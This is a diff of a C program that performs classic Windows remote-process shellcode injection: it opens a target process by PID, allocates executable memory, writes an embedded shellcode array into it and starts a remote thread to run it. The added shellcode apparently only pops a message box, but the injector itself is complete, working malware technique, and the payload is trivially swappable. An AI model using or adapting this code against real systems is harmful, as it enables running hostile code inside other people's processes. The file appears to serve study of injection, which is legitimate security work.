@@ -5,32 +5,101 @@
 #define Info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
 #define Warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
 
-DWORD PID = 0;
-HANDLE hProcess, hThread = NULL;
-LPVOID rBuffer = NULL;
 int main(int argc, char *argv[]) {
-  unsigned char ShellCode[] = "";
-  if (argc < 2) {
-    // if the user didn't provide at least one argument after the programme name
-    // we print a message.
 
-    Warn("Usage Programme.exe <PID>");
+  DWORD dwPID = 0, dwTID = 0;
+  HANDLE hProcess = NULL, hThread = NULL;
+  LPVOID rAlloc_mem = NULL;
+
+  unsigned char ShellCode[] =
+      "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
+      "\x51\x41\x50\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b"
+      "\x52\x18\x51\x56\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d"
+      "\x31\xc9\x48\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02"
+      "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
+      "\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02"
+      "\x41\x51\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
+      "\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b"
+      "\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
+      "\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
+      "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
+      "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
+      "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41"
+      "\x58\x41\x58\x5e\x48\x01\xd0\x59\x5a\x41\x58\x41\x59\x41"
+      "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+      "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
+      "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
+      "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x0f"
+      "\x00\x00\x00\x49\x20\x4c\x69\x63\x6b\x65\x64\x20\x48\x65"
+      "\x72\x74\x61\x00\x5a\xe8\x09\x00\x00\x00\x49\x6e\x6a\x65"
+      "\x63\x74\x65\x64\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83"
+      "\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
+      "\xd5";
+
+  if (argc < 2) {
+    // If the user didn't provide at least one argument after the program name,
+    // print a message.
+    Warn("Usage: Programme.exe <PID>");
     return EXIT_FAILURE;
   }
-  // if the proggrame has been supplied with an PID then we turn the input into
-  // an INT
-  PID = atoi(argv[1]);
-  okay("Trying to open the proggrame <%ld>", PID);
-  // now we open a handle to the process
-  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+
+  // If the program has been supplied with a PID, convert the input into an INT.
+  dwPID = atoi(argv[1]);
+
+  okay("Trying to open the program <%ld>", dwPID);
+
+  // Now open a handle to the process.
+  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+
   if (hProcess == NULL) {
-    Warn("Coudon't get a handle to the process <%ld>, error: %ld", PID,
+    Warn("Couldn't get a handle to the process <%ld>, error: %ld", dwPID,
          GetLastError());
     return EXIT_FAILURE;
   }
 
-  //  now we allocate Bytes to the process memory
-  rBuffer = VirtualAllocEX(hProcess, NULL, sizeof(ShellCode),
-                           (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+  okay("Got a handle to the process <%ld>\n\\---0x%p", dwPID, hProcess);
+
+  // Now allocate bytes to the process memory.
+  rAlloc_mem =
+      VirtualAllocEx(hProcess, NULL, sizeof(ShellCode),
+                     (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+  if (!rAlloc_mem) {
+    Warn("VirtualAllocEx failed. Error: %lu", GetLastError());
+    CloseHandle(hProcess);
+    return EXIT_FAILURE;
+  }
+
+  okay("Allocated %zu bytes with PAGE_EXECUTE_READWRITE permissions",
+       sizeof(ShellCode));
+
+  // Now write the shellcode into the memory.
+  if (WriteProcessMemory(hProcess, rAlloc_mem, ShellCode, sizeof(ShellCode),
+                         NULL)) {
+    okay("Wrote %zu bytes to memory\n", sizeof(ShellCode));
+  } else {
+    Warn("Failed to write to process memory: %lu", GetLastError());
+    return EXIT_FAILURE;
+  }
+
+  // Now create a thread to run our payload.
+  hThread = CreateRemoteThreadEx(hProcess, NULL, 0,
+                                 (LPTHREAD_START_ROUTINE)rAlloc_mem, NULL, 0, 0,
+                                 &dwTID);
+
+  if (hThread == NULL) {
+    Warn("Failed to get handle to the thread, error: %ld", GetLastError());
+    CloseHandle(hProcess);
+    return EXIT_FAILURE;
+  }
+  okay("Got a handle to the thread <%ld>\n\\---0x%p", dwTID, hThread);
+
+  okay("Waiting for thread to finish executing");
+  WaitForSingleObject(hThread, INFINITE);
+  okay("Thread finsihed execution");
+
+  okay("Closing the handles\n");
+  CloseHandle(hThread);
+  CloseHandle(hProcess);
+  okay("Finished!");
   return EXIT_SUCCESS;
 }
